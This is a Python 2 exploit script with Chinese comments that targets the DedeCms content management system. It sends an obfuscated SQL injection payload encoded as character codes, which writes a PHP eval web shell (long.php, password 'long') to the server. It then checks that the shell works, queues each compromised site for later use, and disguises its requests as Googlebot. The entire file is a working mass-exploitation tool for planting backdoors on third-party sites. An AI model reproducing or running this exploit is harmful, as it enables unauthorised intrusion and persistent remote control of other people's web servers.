#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#dedecms漏洞getshell EXP最新可用鬼哥的洞洞
#参考https://www.t00ls.net/thread-23103-1-1.html
#转换方法 http://wdot.cc/dede.php
#http://bugscan.net/plugin/84
import httplib
import sys
import threading

from class_Queue import url_exp
from yijuhua_CS import yijuhua_cs

class dedecms_getshell:
    def assign(self,service, arg=None):
        if service == 'DedeCms':
            return True, arg

    def scan(self,arg):
        try:
            self.url0, self.url1 = arg
            path=""
            site = path+'''/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=48&arrs2[]=48&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=108&arrs2[]=111&arrs2[]=110&arrs2[]=103&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=108&arrs2[]=111&arrs2[]=110&arrs2[]=103&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96'''
            httpres = self.request(self.url1,site)
            if httpres:
                self.two(self.url1,path)
            return 1
        except Exception,e:
            #print e
            return 0

    def two(self,arg,path):
        try:
            site = path+'/plus/mytag_js.php?aid=9000'
            httpres = self.request(arg,site)
            html = None
            if httpres:
                html = httpres.read()
                if 'write' in html:
                    self.three(arg,path)
                else:
                    #print u' \n亲,你点真背,不存在漏洞!'
                    return 0
            return 1
        except Exception,e:
            #print e
            return 0

    def three(self,arg,path):
        try:
            site = path+'/plus/long.php'
            testsite = path+'/plus/shaoxhaoxhaoxhaoshaoxhaoxhaoxhaoshaoxhaoxhaoxhaoshaoxhaoxhaoxhao.php'
            httpres = self.request(arg,site)
            code = None
            testcode = None
            testhttpres = self.request(arg,testsite)
            if testhttpres:
                testcode = testhttpres.status  #返回值
            if httpres:
                code = httpres.status #返回值
                if code != testcode: #不相等为有效
                    #print u' \nGood,write OK ! Shell :%s%s  pass:long' % (arg,site)
                    if yijuhua_cs("php",arg+site,"long"):   #ASP还是PHP  ,URL地址 ，密码
                    #是
                        EXP_list=[1,self.url0,self.url1,"CN_exp_dedecms_getshell",arg.strip()+site,"long","webshell"]
                        #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                        #print EXP_list
                        url_exp.put(EXP_list,0.5)   #插入队列
                    else:
                    #否
                        EXP_list=[0,self.url0,self.url1,"CN_exp_dedecms_getshell",arg.strip()+site,"long","webshell"]
                        #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                        #print EXP_list
                        url_exp.put(EXP_list,0.5)   #插入队列

#                    print "exp_dedecms_getshell---%s---%s"%(arg.strip()+site,"webshell--pass:guige")
                else:
                    #print u' \n亲,你点真背,不存在漏洞!'
                    return 0
            return 0
        except Exception,e:
            #print e
            return 0

    def request(self,arg,site):
        try:
            url = arg.split('//')[1]
            headers = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
            conn = httplib.HTTPConnection(url)
            conn.request('GET',site,None,headers)
            httpres = conn.getresponse()
            return httpres
        except Exception,e:
            #print e
            return 0


################################################
if __name__=='__main__':
    class_www=dedecms_getshell()
    class_www.scan(class_www.assign('DedeCms', ("http://www.baidu.com","http://91qingniao.com"))[1])

